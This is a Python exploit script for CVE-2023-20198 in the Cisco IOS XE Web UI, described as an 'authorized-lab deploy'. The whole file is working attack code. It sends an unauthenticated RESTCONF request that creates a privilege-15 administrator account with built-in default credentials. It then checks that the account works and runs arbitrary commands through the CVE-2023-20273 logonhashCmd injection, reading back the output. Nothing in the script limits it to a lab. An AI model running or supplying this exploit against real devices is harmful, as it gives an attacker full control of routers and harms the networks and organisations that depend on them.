#!/usr/bin/env python3
"""CVE-2023-20198 (Cisco IOS XE Web UI) - authorized-lab deploy.

Unauthenticated RESTCONF access lets an attacker create a local user with
privilege 15 (CVE-2023-20198). This deploy:
1. Probes the Web UI / RESTCONF presence.
2. Creates a privilege-15 user via POST to the escaped RESTCONF YANG path
   (Cisco-IOS-XE-native:native/username).
3. Verifies the account by querying RESTCONF with the new credentials.
4. Best-effort command execution via CVE-2023-20273 (logonhashCmd sink)
   using the created account, retrieving output from the response.
"""
import argparse
import json
import random
import string
import sys
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def rand_str(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def check_webui(base, timeout):
    try:
        r = requests.get(base + "/webui/login", verify=False, timeout=timeout)
        return {"status": r.status_code, "iosxe_webui": "webui" in r.text.lower() or r.status_code == 200}
    except requests.exceptions.RequestException as exc:
        return {"error": "%s: %s" % (type(exc).__name__, exc)}


def create_admin(base, username, password, timeout):
    body = {
        "Cisco-IOS-XE-native:username": {
            "name": username,
            "privilege": 15,
            "password": {"encryption": "0", "secret": password},
        }
    }
    try:
        r = requests.post(
            base + "/restconf/data/Cisco-IOS-XE-native:native/username",
            json=body,
            headers={"Content-Type": "application/yang-data+json",
                     "Accept": "application/yang-data+json"},
            verify=False,
            timeout=timeout,
        )
        return {"status": r.status_code, "body_excerpt": r.text[:300]}, r.status_code in (200, 201, 204)
    except requests.exceptions.RequestException as exc:
        return {"error": "%s: %s" % (type(exc).__name__, exc)}, False


def verify_admin(base, username, password, timeout):
    try:
        r = requests.get(
            base + "/restconf/data/Cisco-IOS-XE-native:native/username/" + username,
            auth=(username, password),
            headers={"Accept": "application/yang-data+json"},
            verify=False,
            timeout=timeout,
        )
        return {"status": r.status_code, "body_excerpt": r.text[:300]}, r.status_code == 200
    except requests.exceptions.RequestException as exc:
        return {"error": "%s: %s" % (type(exc).__name__, exc)}, False


def command_exec(base, username, password, command, marker, timeout):
    url = base + "/webui/logoutconfirm.jsp?logonhashCmd=" + quote("echo %s; %s; echo %s" % (marker, command, marker))
    try:
        r = requests.get(url, auth=(username, password), verify=False, timeout=timeout)
        body = r.text
        out = {"status": r.status_code, "executed": False, "output": None, "error": None}
        if marker in body:
            out["executed"] = True
            out["output"] = body.split(marker, 1)[1].rsplit(marker, 1)[0].strip()
        return out
    except requests.exceptions.RequestException as exc:
        return {"executed": False, "output": None, "error": "%s: %s" % (type(exc).__name__, exc)}


def run(args):
    base = "https://%s:%d" % (args.target, args.port)
    result = {
        "cve": "CVE-2023-20198",
        "target": base,
        "vulnerable": False,
        "verified_by": None,
        "webui_check": None,
        "created_user": None,
        "user_verification": None,
        "command_execution": None,
        "error": None,
    }
    result["webui_check"] = check_webui(base, args.timeout)
    if "error" in result["webui_check"]:
        result["error"] = "IOS XE Web UI unreachable"
        return result

    marker = "ios" + rand_str(8)
    create_detail, ok = create_admin(base, args.username, args.password, args.timeout)
    result["created_user"] = dict(create_detail, username=args.username)
    if not ok:
        result["error"] = "user creation failed (not vulnerable or user exists)"
        return result
    result["vulnerable"] = True
    result["verified_by"] = "unauthenticated privilege-15 user created via RESTCONF (CVE-2023-20198)"

    verify_detail, ok = verify_admin(base, args.username, args.password, args.timeout)
    result["user_verification"] = dict(verify_detail, valid=bool(ok))
    if ok:
        result["verified_by"] += "; new account authenticated successfully over RESTCONF"

    result["command_execution"] = command_exec(base, args.username, args.password,
                                              args.command, marker, args.timeout)
    if result["command_execution"].get("executed"):
        result["verified_by"] += "; command executed via CVE-2023-20273 logonhashCmd"
    return result


def main():
    p = argparse.ArgumentParser(description="CVE-2023-20198 IOS XE WebUI authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=443)
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--username", default="qm_admin", help="privilege-15 user to create (default: qm_admin)")
    p.add_argument("--password", default="Qm!Deploy1", help="password for the created user")
    p.add_argument("--command", default="show privilege", help="IOS exec command for the 20273 check")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:
        result = {"cve": "CVE-2023-20198", "target": "%s:%d" % (args.target, args.port),
                  "vulnerable": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
